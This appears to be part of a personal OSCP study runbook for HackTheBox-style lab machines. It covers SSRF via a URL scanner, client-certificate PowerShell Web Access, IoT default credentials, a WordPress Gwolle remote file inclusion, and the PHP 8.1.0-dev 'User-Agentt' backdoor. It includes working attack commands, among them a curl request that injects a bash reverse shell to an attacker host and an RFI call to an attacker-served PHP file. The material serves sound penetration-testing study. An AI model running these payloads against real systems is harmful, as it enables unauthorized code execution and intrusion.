**Note:** This is NOT an SSRF in the traditional HTTP-request-to-internal-service sense. It's more accurately a Server-Side JavaScript Injection that achieves local file read. However the category is functionally identical for recon purposes, you're exfiltrating data from the server via a forged request origin.

See [[27. Assembling the Pieces|AEN.3 Q6 (tracking.inlanefreight.local)]] for the example.

#### Tags: #SSRF #PDFInjection #XMLHttpRequest #LocalFileRead #wkhtmltopdf #ServerSideRendering #HTBSupplementary

---

## Love: SSRF from a URL scanner to an internal HTTP service

When a staging virtual host exposes a URL scanner, test whether it can fetch the protected HTTP service bound to loopback. Keep the public host and the internal destination explicit so the request is reproducible and the response is easy to save for review.

```bash
boxset VHost "staging.love.htb"

curl -sS --resolve "$VHost:$WebPort:$BoxIP" \
  "http://$VHost:$WebPort/" | tee "$BoxDir/loot/staging-root.txt"

curl -sS --resolve "$VHost:$WebPort:$BoxIP" \
  -X POST --data-urlencode 'file=http://127.0.0.1:5000/' \
  --data-urlencode 'read=Scan file' \
  "http://$VHost:$WebPort/beta.php" | tee "$BoxDir/loot/ssrf-5000.txt"
```

The scanner’s response can disclose an internal admin page or other sensitive material. Preserve the raw response only in the local loot directory, redact credentials from notes, and use the disclosed route to continue with authenticated application testing. Review [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]].

#### Tags: #SSRF #VirtualHost #InternalService #URLScanner #SensitiveDataExposure

---

## **Outstanding**
This area grows alongside the modules. The current follow-up is to add Drupal, Joomla, and Tomcat Manager entries when their source material is written. Each entry belongs in this appendix under the matching application heading and must link back to its module source.
## IIS image review and client-certificate PowerShell Web Access

~~~bash
# Save the homepage and extract every referenced image
curl -s http://$BoxIP/ -o $BoxDir/loot/homepage.html
mkdir -p $BoxDir/loot/images
grep -oP 'images/[^"]+\.(jpg|png|gif)' $BoxDir/loot/homepage.html |
  sort -u | while read img; do
    curl -s http://$BoxIP/$img -o $BoxDir/loot/images/$(basename $img)
  done

# Inspect certificate-authenticated IIS redirects
curl -skL https://$Domain/staff --cert-type P12 \
  --cert $BoxDir/loot/staff.pfx:$PfxPass \
  -D $BoxDir/loot/pswa-headers.txt \
  -c $BoxDir/loot/cookies.txt -b $BoxDir/loot/cookies.txt \
  -o $BoxDir/loot/staff-logon.html
~~~

Review downloaded images at readable resolution. If a PFX is accepted, preserve the redirect chain, hidden ASP.NET fields, and cookies before using a browser to complete PSWA. A 401 from /certsrv is useful AD CS evidence even if it is not the first foothold.

See [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]] and [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].

## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[OSCP/MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source archive review, upload-to-webshell execution, and asynchronous filename command injection
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- custom PHP file parameter, LFI source review, and safe handling of encoded credential material
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- robots/Gobuster triage, aggressive WPScan plugin discovery, and Gwolle RFI validation
- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- multipart XML XXE, source-driven Python pickle proof, SSH-key extraction, and Git-history credential hunting
- [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- Pi-hole fingerprinting, `/admin/` discovery, exposed web metadata, and controlled IoT credential validation
- [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- WordPress REST disclosure, plugin JAR analysis, and slow-response timing triage
- [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- staging virtual-host routing, URL-scanner SSRF to loopback, and authenticated Voting System upload

## IoT product fingerprint and default-credential validation

When a web response identifies an appliance or embedded product, save the headers and management page before testing credentials. A 404 can still be a useful fingerprint if its headers name the product.

```bash
curl -sS -i "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/http-root.txt"
curl -sS -L "http://$BoxIP:$WebPort/admin/" \
  | tee "$BoxDir/loot/http-admin.html"
grep -Ein 'product|version|firmware|login|admin|pi-hole' \
  "$BoxDir/loot/http-root.txt" "$BoxDir/loot/http-admin.html"
curl -sS "http://$BoxIP:$WebPort/admin/.git/HEAD" \
  | tee "$BoxDir/loot/application-git-head.txt"
```

Set the account name from the product evidence and enter any authorised factory credential privately at the SSH prompt. Do not place the value in the command line, shell history, or report.

```bash
ssh -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -p "$SshPort" "$Username@$BoxIP"
id
whoami
hostname
```

If local enumeration exposes removable media, record metadata without opening completion files:

```bash
mount | grep -E '/media|/mnt|/dev/sd'
lsblk -f
df -h
ls -la "$UsbMount"
file -s "$UsbDevice"
stat "$UsbMount"/* 2>/dev/null
```

The detailed decision path is [[OSCP/RUNBOOK V2/Linux - IoT Default Credentials|Linux - IoT Default Credentials]].

## WordPress plugin discovery and Gwolle RFI

Use WordPress-aware enumeration when a WordPress path is confirmed:

```bash
wpscan --url "http://$BoxIP/webservices/wp/" \
  --enumerate u,vp,vt --plugins-detection aggressive \
  --output "$BoxDir/loot/wpscan-aggressive.txt"
```

For the Gwolle Guestbook `ajaxresponse.php` RFI, prove execution with a harmless command before sending a callback:

```bash
curl -sS -G \
  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" \
  --data-urlencode 'cmd=id'
```

Serve a minimal controlled PHP file with `python3 -m http.server`; base64-encode nested reverse-shell text if quoting becomes unreliable.

## PHP 8.1.0-dev `User-Agentt` backdoor

When HTTP headers disclose `X-Powered-By: PHP/8.1.0-dev`, test the known development-build backdoor with a harmless identity command. The trigger is the misspelled `User-Agentt` header, with two `t` characters.

```bash
curl -sSI "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/headers.txt"
curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
  "http://$BoxIP:$WebPort/" | grep -m1 'uid='
```

After the output proves execution, send the callback through the same header:

```bash
nc -lvnp "$Lport"
curl --max-time 10 -fsS \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
  "http://$BoxIP:$WebPort/" >/dev/null
```

`zerodiumsystem()` is evaluated by the compromised PHP build. Treat the header as a command-execution primitive, not as a normal application parameter, and move to [[RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] after the identity proof.

**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
